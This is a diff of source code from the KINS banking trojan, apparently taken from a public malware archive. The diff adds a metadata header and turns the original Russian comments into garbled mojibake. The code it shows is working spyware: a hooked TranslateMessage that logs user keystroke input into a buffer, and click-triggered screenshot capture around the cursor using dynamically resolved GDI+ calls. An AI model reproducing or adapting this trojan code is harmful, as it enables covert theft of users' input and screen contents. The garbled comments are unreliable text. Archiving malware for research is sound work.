@@ -1,3 +1,14 @@
+/*
+  name      KINS
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <shlwapi.h>
 #include <wininet.h>
@@ -26,15 +37,15 @@ static WORD  imageClicksCount;
 static LPWSTR imageFilePrefix;
 
 /*
-  Добавление строки в буффер ввода.
+  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 
-  IN string - строка для добавления.
+  IN string - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 */
 static void addString(const LPWSTR string)
 {
   int stringSize = Str::_LengthW(string);
   
-  //Если строка слишком длинная, эти данные нас врятли интересуют. Поэтому сбрасываем буфер.
+  //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
   if(stringSize > USERINPUT_MAX_CHARS)UserHook::clearInput();
   else
   {
@@ -106,7 +117,7 @@ typedef BOOL    (WINAPI *DELETEDC)(HDC hdc);
   Gdiplus::GdiplusStartupInput startupInput;
   ULONG_PTR token;
 
-  //Загрузка gdiplus.dll.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ gdiplus.dll.
   gdiPlusDll = CWA(kernel32, LoadLibraryA)("gdiplus.dll");
   GDIPLUSSTARTUP              gpStartup                 = (GDIPLUSSTARTUP)CWA(kernel32, GetProcAddress)(gdiPlusDll,              "GdiplusStartup");
   GDIPLUSSHUTDOWN             gpShutdown                = (GDIPLUSSHUTDOWN)CWA(kernel32, GetProcAddress)(gdiPlusDll,             "GdiplusShutdown");
@@ -121,7 +132,7 @@ typedef BOOL    (WINAPI *DELETEDC)(HDC hdc);
     goto END;
   }
 
-  //Загрузка ole32.dll.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ole32.dll.
   ole32Dll = CWA(kernel32, LoadLibraryA)("ole32.dll");
   CREATESTREAMONHGLOBAL createStreamOnHGlobal = (CREATESTREAMONHGLOBAL)CWA(kernel32, GetProcAddress)(ole32Dll, "CreateStreamOnHGlobal");
   if(createStreamOnHGlobal == NULL)
@@ -130,7 +141,7 @@ typedef BOOL    (WINAPI *DELETEDC)(HDC hdc);
     goto END;
   }
   
-  //Загрузка gdi32.dll.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ gdi32.dll.
   gdi32Dll = CWA(kernel32, LoadLibraryA)("gdi32.dll");
   CREATEDCW              createDcW              = (CREATEDCW)CWA(kernel32, GetProcAddress)(gdi32Dll,              "CreateDCW");
   CREATECOMPATIBLEDC     createCompatibleDC     = (CREATECOMPATIBLEDC)CWA(kernel32, GetProcAddress)(gdi32Dll,     "CreateCompatibleDC");
@@ -147,7 +158,7 @@ typedef BOOL    (WINAPI *DELETEDC)(HDC hdc);
   }
 
   //////////////////////////////////////////////////////////////////////////////////////////////////
-  // Инициализация
+  // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
   //////////////////////////////////////////////////////////////////////////////////////////////////
 
   startupInput.GdiplusVersion = 1;
@@ -163,14 +174,14 @@ typedef BOOL    (WINAPI *DELETEDC)(HDC hdc);
       HDC memDc = createCompatibleDC(dc);
       if(memDc != NULL)
       {
-        //Загружаем данные курсора.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         POINT cursorPos;
         ICONINFO cursorInfo;
         HCURSOR cursor = _loadSharedCursor(NULL, MAKEINTRESOURCEW(OCR_NORMAL));
         if(cursor != NULL && (CWA(user32, GetIconInfo)(cursor, &cursorInfo) == FALSE || CWA(user32, GetCursorPos)(&cursorPos) == FALSE))cursor = NULL;
-        if(cursor == NULL)rectSize = 0; //Переходим в режим рисования всего скрина.
+        if(cursor == NULL)rectSize = 0; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
         
-        //Получем размер изображения.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         int width, height;
         if(rectSize != 0)
         {
@@ -183,14 +194,14 @@ typedef BOOL    (WINAPI *DELETEDC)(HDC hdc);
           height = getDeviceCaps(dc, VERTRES);
         }
         
-        //Создаем изображение.
+        //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
         HBITMAP bitmap = createCompatibleBitmap(dc, width, height);
         if(bitmap != NULL)
         {
           HBITMAP oldBitmap = (HBITMAP)selectObject(memDc, bitmap);
           if(oldBitmap != NULL)
           {
-            //Копируем изображение.
+            //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
             int x = 0, y = 0;
             if(rectSize != 0)
             {
@@ -202,7 +213,7 @@ typedef BOOL    (WINAPI *DELETEDC)(HDC hdc);
 
             if(bitBlt(memDc, 0, 0, width, height, dc, x, y, SRCCOPY | CAPTUREBLT) != FALSE)
             {
-              //Рисуем курсор.
+              //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
               if(cursor != NULL)
               {
                 if((x = cursorPos.x - cursorInfo.xHotspot) < 0)x = 0;
@@ -210,11 +221,11 @@ typedef BOOL    (WINAPI *DELETEDC)(HDC hdc);
                 CWA(user32, DrawIcon)(memDc, x, y, cursor);
               }
 
-              //Конвертируем в Stream.
+              //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ Stream.
               Gdiplus::GpBitmap *gpBitmap = NULL;
               if(gpCreateBitmapFromHBitmap(bitmap, NULL, &gpBitmap) == Gdiplus::Ok && gpBitmap != NULL)
               {
-                //Поиск нужного кодека.
+                //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
                 UINT countOfEncoders = 0;
                 UINT sizeOfEncoders  = 0;
                 Gdiplus::ImageCodecInfo* imageCodecInfo;
@@ -236,14 +247,14 @@ typedef BOOL    (WINAPI *DELETEDC)(HDC hdc);
                   }
                   Mem::free(imageCodecInfo);
 
-                  //Кодек найден.
+                  //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
                   if(countOfEncoders == 0 && createStreamOnHGlobal(NULL, TRUE, &stream) == S_OK && stream != NULL)
                   {
-                    //Опции Кодека
+                    //пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
                     Gdiplus::EncoderParameters params;
                     params.Count = 0;
 
-                    //Качество картинки
+                    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
                     if(quality > 0)
                     {
                       Mem::_copy(&params.Parameter[params.Count].Guid, &encoderQuality, sizeof(GUID));
@@ -253,7 +264,7 @@ typedef BOOL    (WINAPI *DELETEDC)(HDC hdc);
                       params.Count++;
                     }
 
-                    //Сохраняем.
+                    //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
                     if(gpSaveImageToStream(gpBitmap, stream, &encoderClsid, &params) != Gdiplus::Ok)
                     {
                       stream->Release();
@@ -261,7 +272,7 @@ typedef BOOL    (WINAPI *DELETEDC)(HDC hdc);
                     }
                     else
                     {
-                      //Финал.
+                      //пїЅпїЅпїЅпїЅпїЅ.
                       LARGE_INTEGER li;
                       li.HighPart = 0;
                       li.LowPart  = 0;
@@ -339,7 +350,7 @@ DWORD UserHook::getInput(LPWSTR *buffer)
       *buffer = p;
       retVal = userInputBufferSize;
       
-      //Убираем служебные символы.
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
       for(DWORD i = 0; i < userInputBufferSize; i++)if(p[i] < 0x20)p[i] = 0x20;
     }
   }
@@ -349,7 +360,7 @@ DWORD UserHook::getInput(LPWSTR *buffer)
 
 BOOL WINAPI UserHook::hookerTranslateMessage(const MSG *msg)
 {
-  //WDEBUG0(WDDT_INFO, "Called"); //Тормаза дает.
+  //WDEBUG0(WDDT_INFO, "Called"); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
   if(msg != NULL && DllCore::isActive())
   {
 	if(msg->message == WM_LBUTTONDOWN)
